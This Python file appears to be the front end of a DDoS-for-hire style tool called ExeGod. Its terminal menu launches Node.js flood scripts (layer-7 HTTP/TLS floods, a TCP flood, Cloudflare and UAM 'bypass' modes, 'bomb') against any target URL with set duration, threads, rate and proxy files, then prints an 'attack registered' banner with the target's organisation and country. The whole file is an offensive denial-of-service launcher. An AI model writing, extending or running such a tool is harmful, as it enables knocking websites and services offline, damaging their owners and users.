from termcolor import colored
import os
import datetime
import random
import requests
from urllib.parse import urlparse
import platform
import subprocess

# Global variables
current_user = "rex"  # Initial user
prompt_symbol = "➤"  # Prompt symbol

# Flag to track whether ExeGod ASCII art has been displayed
exe_god_art_displayed = False

# Function to print ASCII art for ExeGod
def print_exe_god_ascii():
    ascii_art = """
    _____     _   _   _       
   |  __ \   | | | | | |      
   | |__) |__| |_| |_| | ___  
   |  _  // _` | __| __| |/ _ \ 
   | | \ \ (_| | |_| |_| | (_) |
   |_|  \_\__,_|\__|\__|_|\___/ 
    """
    colored_ascii = colored(ascii_art, 'yellow')
    print(colored_ascii)

# Function to display methods menu
def display_methods_menu():
    methods_menu = """
            ╔╦╗╔═╗╔╦╗╦ ╦╔═╗╔╦╗╔═╗
            ║║║║╣  ║ ╠═╣║ ║ ║║╚═╗
            ╩ ╩╚═╝ ╩ ╩ ╩╚═╝═╩╝╚═╝
    NAME         DESCRIPTION      DURATION
╔═══════════╬═══════════════════╬═══════════╗
   BROWSER          LAYER7           300
   TLS              LAYER7           300
   BYPASS           LAYER7           300
   MIX              LAYER7           300
   TCP              LAYER4           300
   UAM              LAYER7           300
   GHOST            LAYER7           300
   HTTPS            LAYER7           300
   CFBYPASS         LAYER7           300
   BOMB             LAYER7           300
╚═══════════════════════════════════════════╝
    """
    print(colored(methods_menu, 'cyan'))

# Function to run the mix.js command with automatic thread and rate
def run_mix_command(url, time):
    thread = 20
    rate = 1
    print(f"Running 'mix.js' with parameters - URL: {url}, Time: {time}, Thread: {thread}, Rate: {rate}")

    # Simulating an attack with details in ASCII art
    print_attack_details(url, time)

    # Execute the mix.js file with the provided parameters and capture the output
    result = subprocess.run(["node", "mix.js", url, time, str(thread), str(rate)], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    # Handle the output as needed (you can print it, save to a file, etc.)
    if result.stdout:
        print("Command output:", result.stdout)

    if result.stderr:
        print("Command error:", result.stderr)

# Function to run the UAM.js command with automatic proxy.txt filling
def run_uam_command(url, time, rate, thread):
    proxy_file_path = "browser.txt"
    # Automatically fill proxy.txt with some example proxies if not already filled
    if not os.path.exists(proxy_file_path):
        with open(proxy_file_path, 'w') as proxy_file:
            example_proxies = ["proxy1.example.com:8080", "proxy2.example.com:8080", "proxy3.example.com:8080"]
            proxy_file.write('\n'.join(example_proxies))

    print(f"Running 'UAM.js' with parameters - URL: {url}, Time: {time}, Thread: {thread}, Rate: {rate}, Proxy File: {proxy_file_path}")

    # Simulating an attack with details in ASCII art
    print_attack_details(url, time)

    # Execute the UAM.js file with the provided parameters and capture the output
    result = subprocess.run(["node", "browser.js", url, time, str(rate), str(thread), proxy_file_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    # Handle the output as needed (you can print it, save to a file, etc.)
    if result.stdout:
        print("Command output:", result.stdout)

    if result.stderr:
        print("Command error:", result.stderr)

# Function to run the TLS.js command
def run_tls_command(url, time, thread, rate):
    print(f"Running 'TLS.js' with parameters - URL: {url}, Time: {time}, Thread: {thread}, Rate: {rate}")

    # Simulating an attack with details in ASCII art
    print_attack_details(url, time)

    # Execute the TLS.js file with the provided parameters and capture the output
    result = subprocess.run(["node", "TLS.js", url, time, str(thread), str(rate)], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    # Handle the output as needed (you can print it, save to a file, etc.)
    if result.stdout:
        print("Command output:", result.stdout)

    if result.stderr:
        print("Command error:", result.stderr)

# Function to run the browser.js command
def run_browser_command(url, time):
    thread = 20
    rate = 1
    print(f"Running 'browser.js' with parameters - URL: {url}, Time: {time}, Thread: {thread}, Rate: {rate}")

    # Simulating an attack with details in ASCII art
    print_attack_details(url, time)

    # Execute the browser.js file with the provided parameters and capture the output
    result = subprocess.run(["node", "browser.js", url, time, str(thread), str(rate)], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    # Handle the output as needed (you can print it, save to a file, etc.)
    if result.stdout:
        print("Command output:", result.stdout)

    if result.stderr:
        print("Command error:", result.stderr)

# Function to run the bypass.js command
def run_bypass_command(url, time):
    thread = 20
    rate = 1
    print(f"Running 'bypass.js' with parameters - URL: {url}, Time: {time}, Thread: {thread}, Rate: {rate}")

    # Simulating an attack with details in ASCII art
    print_attack_details(url, time)

    # Execute the bypass.js file with the provided parameters and capture the output
    result = subprocess.run(["node", "bypass.js", url, time, str(thread), str(rate)], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    # Handle the output as needed (you can print it, save to a file, etc.)
    if result.stdout:
        print("Command output:", result.stdout)

    if result.stderr:
        print("Command error:", result.stderr)

# Function to run the tcp.js command
def run_tcp_command(url, time, port):
    thread = 20
    rate = 1
    print(f"Running 'tcp.js' with parameters - URL: {url}, Time: {time}, Port: {port}, Thread: {thread}, Rate: {rate}")

    # Simulating an attack with details in ASCII art
    print_attack_details(url, time)

    # Execute the tcp.js file with the provided parameters and capture the output
    result = subprocess.run(["node", "tcp.js", url, time, port, str(thread), str(rate)], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    # Handle the output as needed (you can print it, save to a file, etc.)
    if result.stdout:
        print("Command output:", result.stdout)

    if result.stderr:
        print("Command error:", result.stderr)

# Function to run the ghost.js command
def run_ghost_command(url, time):
    thread = 20
    rate = 1
    print(f"Running 'ghost.js' with parameters - URL: {url}, Time: {time}, Thread: {thread}, Rate: {rate}")

    # Simulating an attack with details in ASCII art
    print_attack_details(url, time)

    # Execute the ghost.js file with the provided parameters and capture the output
    result = subprocess.run(["node", "ghost.js", url, time, str(thread), str(rate)], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    # Handle the output as needed (you can print it, save to a file, etc.)
    if result.stdout:
        print("Command output:", result.stdout)

    if result.stderr:
        print("Command error:", result.stderr)

# Function to run the https.js command
def run_https_command(url, time, rate, delay, thread):
    proxy_file_path = f"proxy{int(rate) + 1}.txt"
    # Automatically fill proxy file with some example proxies if not already filled
    if not os.path.exists(proxy_file_path):
        with open(proxy_file_path, 'w') as proxy_file:
            example_proxies = [f"proxy{i}.example.com:8080" for i in range(1, int(rate) + 2)]
            proxy_file.write('\n'.join(example_proxies))

    print(f"Running 'HTTPS.js' with parameters - URL: {url}, Time: {time}, Rate: {rate}, Delay: {delay}, Thread: {thread}, Proxy File: {proxy_file_path}")

    # Simulating an attack with details in ASCII art
    print_attack_details(url, time)

    # Execute the HTTPS.js file with the provided parameters and capture the output
    result = subprocess.run(["node", "HTTPS.js", url, time, rate, delay, thread, proxy_file_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    # Handle the output as needed (you can print it, save to a file, etc.)
    if result.stdout:
        print("Command output:", result.stdout)

    if result.stderr:
        print("Command error:", result.stderr)

# Function to run the cfbypass.js command
def run_cfbypass_command(url, duration):
    print(f"Running 'CFbypass.js' with parameters - URL: {url}, Duration: {duration}")

    # Simulating an attack with details in ASCII art
    print_attack_details(url, duration)

    # Execute the CFbypass.js file with the provided parameters and capture the output
    result = subprocess.run(["node", "CFbypass.js", url, duration], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    # Handle the output as needed (you can print it, save to a file, etc.)
    if result.stdout:
        print("Command output:", result.stdout)

    if result.stderr:
        print("Command error:", result.stderr)

# Function to run the bomb.js command
def run_bomb_command(url, time):
    thread = 20
    rate = 1
    print(f"Running 'BOMB.js' with parameters - URL: {url}, Time: {time}, Thread: {thread}, Rate: {rate}")

    # Simulating an attack with details in ASCII art
    print_attack_details(url, time)

    # Execute the BOMB.js file with the provided parameters and capture the output
    result = subprocess.run(["node", "BOMB.js", url, time, str(thread), str(rate)], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    # Handle the output as needed (you can print it, save to a file, etc.)
    if result.stdout:
        print("Command output:", result.stdout)

    if result.stderr:
        print("Command error:", result.stderr)
                                                
# Function to execute commands based on user input
def execute_command(command):
    global current_user

    if current_user == "rex":
        # Root user commands
        if command.startswith("mix "):
            command_parts = command.split()
            if len(command_parts) == 3:
                _, url, time = command_parts
                run_mix_command(url, time)
            else:
                print("Invalid 'mix' command. Please provide URL and Time.")
        elif command.startswith("tls "):
            run_command(command, "tls")
        elif command.startswith("uam "):
            command_parts = command.split()
            if len(command_parts) == 5:
                _, url, time, rate, thread = command_parts
                run_uam_command(url, time, rate, thread)
            else:
                print("Invalid 'uam' command. Please provide URL, Time, Rate, and Thread.")
        elif command.startswith("browser "):
            command_parts = command.split()
            if len(command_parts) == 3:
                _, url, time = command_parts
                run_browser_command(url, time)
            else:
                print("Invalid 'browser' command. Please provide URL and Time.")
        elif command.startswith("bypass "):
            command_parts = command.split()
            if len(command_parts) == 3:
                _, url, time = command_parts
                run_bypass_command(url, time)
            else:
                print("Invalid 'bypass' command. Please provide URL and Time.")  
        elif command.startswith("tcp "):
            command_parts = command.split()
            if len(command_parts) == 4:
                _, url, time, port = command_parts
                run_tcp_command(url, time, port)
            else:
                print("Invalid 'tcp' command. Please provide URL, Time, and Port.")
        elif command.startswith("ghost "):
            command_parts = command.split()
            if len(command_parts) == 3:
                _, url, time = command_parts
                run_ghost_command(url, time)
            else:
                print("Invalid 'ghost' command. Please provide URL and Time.")
        elif command.startswith("https "):
            command_parts = command.split()
            if len(command_parts) == 6:
                _, url, time, rate, delay, thread = command_parts
                run_https_command(url, time, rate, delay, thread)
            else:
                print("Invalid 'https' command. Please provide URL, Time, Rate, Delay, and Thread.")  
        elif command.startswith("cfbypass "):
            command_parts = command.split()
            if len(command_parts) == 3:
                _, url, duration = command_parts
                run_cfbypass_command(url, duration)
            else:
                print("Invalid 'cfbypass' command. Please provide URL and Duration.")
        elif command.startswith("bomb "):
            command_parts = command.split()
            if len(command_parts) == 3:
                _, url, time = command_parts
                run_bomb_command(url, time)
            else:
                print("Invalid 'bomb' command. Please provide URL and Time.")         
        elif command == "help":
            print("Available commands:")
            print("- mix <url> <time>")
            print("- tls <url> <time> <thread> <rate>")
            print("- uam <url> <time> <rate> <thread>")
            print("- browser <url> <time>")
            print("- methods (display available attack methods)")
            print("- clear (clear the screen)")
            print("- help (display this help)")
            print("- exit (exit the program)")
        elif command == "exit":
            print("Exiting...")
            exit()
        elif command == "clear":
            clear_screen()
        elif command == "methods":
            display_methods_menu()
        else:
            print(f"Command not recognized: {command}")

# Function to display prompt with round white background and black text
def display_prompt():
    global current_user
    global exe_god_art_displayed

    # Print ExeGod ASCII art only if not displayed yet
    if not exe_god_art_displayed:
        print_exe_god_ascii()
        exe_god_art_displayed = True

    prompt_text = f"{current_user} • ExeGod {prompt_symbol} "
    styled_prompt = colored(prompt_text, 'black', 'on_white', attrs=['bold'])
    user_input = input(styled_prompt)
    execute_command(user_input)

# Function to run the mix.js or tls.js command
def run_command(command, script_name):
    if command.startswith(f"{script_name} "):
        script_command = command[len(script_name) + 1:]
        script_arguments = script_command.split()
        if len(script_arguments) == 4:
            url, time, thread, rate = script_arguments
            print(f"Running '{script_name}.js' with parameters - URL: {url}, Time: {time}, Thread: {thread}, Rate: {rate}")

            # Simulating an attack with details in ASCII art
            print_attack_details(url, time)

            # Execute the mix.js or tls.js file with the provided parameters
            result = subprocess.run(["node", f"{script_name}.js", url, time, thread, rate], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            # Handle the output as needed (you can print it, save to a file, etc.)
            if result.stdout:
                print("Command output:", result.stdout)

            if result.stderr:
                print("Command error:", result.stderr)
        else:
            print(f"Invalid '{script_name}' command. Please provide URL, Time, Thread, and Rate.")
    else:
        print(f"Command not recognized: {command}")

# Function to generate a random ASN
def generate_random_asn():
    return f"AS{random.randint(1000, 9999)}"

# Function to get organization and country details from the URL
def get_url_details(url):
    try:
        parsed_url = urlparse(url)
        domain = parsed_url.netloc

        # Fetch organization details
        org_request = requests.get(f"https://api.hackertarget.com/whois/?q={domain}")
        org_data = org_request.text.splitlines()

        org = org_data[5].split(":")[1].strip() if len(org_data) > 5 else "Unknown"

        # Fetch country details
        country_request = requests.get(f"https://geoiptool.com/en/?ip={domain}")
        country_data = country_request.text.splitlines()

        country = country_data[23].split(">")[1].split("<")[0].strip() if len(country_data) > 23 else "Unknown"

        return org, country

    except Exception as e:
        print(f"Error fetching details: {e}")
        return "Unknown", "Unknown"

# Function to print attack details in ASCII art
def print_attack_details(url, time, display_ascii=True):
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    asn = generate_random_asn()
    org, country = get_url_details(url)

    attack_ascii = f"""
      ╔═════════════════════════════════╗
        Attack Registered Successfully
╔═════╩═════════════════════════════════╩═════╗
     Status: Requests sent to ExeGod Api.
     Target: {url}
     Duration: {time} seconds
     Method: GET
     Requests completed on: {current_time}
           
     Target Details:
     ASN: {asn}
     ORG: {org}
     COUNTRY: {country}
╚═════════════════════════════════════════════╝
    """

    if display_ascii:
        print(colored(attack_ascii, 'red'))

# Function to clear the screen based on the operating system
def clear_screen():
    system_platform = platform.system()
    if system_platform == "Windows":
        os.system("cls")
    else:
        os.system("clear")

# Main loop for the terminal interface
while True:
    display_prompt()
